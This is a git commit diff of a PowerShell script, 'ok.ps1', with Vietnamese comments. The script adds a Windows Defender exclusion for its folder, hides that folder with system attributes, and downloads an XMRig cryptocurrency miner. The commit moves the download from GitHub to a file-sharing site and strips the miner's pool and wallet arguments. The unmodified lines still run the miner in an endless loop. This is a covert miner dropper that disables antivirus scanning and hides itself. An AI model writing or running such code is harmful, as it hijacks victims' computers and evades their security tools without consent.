cea19cbe191aa43f908189d0b8bd3d068d06700c
43a1723 <hai1723notgay@gmail.com>
2025-02-07 17:27:47 +0700

    Update ok.ps1

--- ok.ps1
+++ ok.ps1
@@ -6,7 +6,7 @@ Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
 # tải miner cho SkibiditoiletMiner
-$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
+$url = "https://anonsharing.com/file/fcd511aeb8b96fef/xmrig-6.21.0.zip"
 $zipPath = "$dir\xmrig.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $dir -Force
@@ -15,5 +15,5 @@ $miner = "$dir\xmrig-6.21.0"
 
 # nạp donate cho SkibiditoiletMiner
 while ($true) {
-    & "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background --max-cpu-usage=50
+    & "$miner\xmrig.exe"
 }
